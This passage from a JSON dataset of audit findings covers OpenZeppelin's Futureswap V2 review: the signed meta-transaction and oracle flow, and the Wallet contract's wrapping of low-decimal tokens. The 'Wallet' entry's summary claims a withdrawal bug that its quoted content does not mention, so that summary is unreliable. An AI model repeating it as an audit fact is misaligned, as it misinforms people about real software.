user message contains a user-chosen nonce (`userInteractionNumber`), which is tracked by the meta transactions system to prevent signature replays.\n\n\n**Update:** *The meta transaction system now requires a signature from a “verifier” that double-checks the information provided by the oracle. It also now requires a signature from a “stamper” that restricts which addresses can relay transactions in the case that the user does not submit their own transaction. These updates are from commit [`3e3a05646d6cac72d07b0dea5db8df9da95df654`](https://github.com/futureswap/fs-core/commit/3e3a05646d6cac72d07b0dea5db8df9da95df654) and [PR #494](https://github.com/futureswap/fs-core/pull/494), respectively.*",
      "summary": "\nFutureswap is a platform that uses meta-transactions and a trusted off-chain oracle to prevent oracle frontrunning issues. A user signs a message containing parameters that describe the action they want to take such as the asset, capital, leverage, min and max asset prices, etc. This message is passed to the oracle which appends price information and the time at which it was signed. This signed message is then passed to the Futureswap MessageProcessor contract which enforces the user-chosen bounds. To prevent signature replays, each user message contains a user-chosen nonce.\n\nRecently, updates were made to the meta transaction system to require a signature from a “verifier” and “stamper”. The verifier double-checks the information provided by the oracle and the stamper restricts which addresses can relay transactions in the case that the user does not submit their own transaction. These updates can be found in commit 3e3a05646d6cac72d07b0dea5db8df9da95df654 and PR #494.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11127",
      "title": "Wallet",
      "impact": "HIGH",
      "content": "All user funds enter and exit through Futureswap’s [`Wallet` contract](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/wallet/Wallet.sol). The Futureswap exchanges work only with ERC20 tokens that have 18 decimals. Futureswap can support tokens that have fewer than 18 decimals because the `Wallet` contract wraps them in a [`DecimalPaddingToken`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/wallet/DecimalPaddingToken.sol) contract, which the exchanges will use in lieu of the original, decimal-deficient token.",
      "summary": "\nFutureswap is a platform that allows users to enter and exit funds through its Wallet contract. It supports ERC20 tokens that have 18 decimals, but can also support tokens with fewer decimals by wrapping them in a DecimalPaddingToken contract. This contract then acts as the token on the exchange instead of the original token. However, a bug has been discovered where if a user withdraws tokens with fewer than 18 decimals, they will not be able to withdraw the full amount of tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    }
  ]
}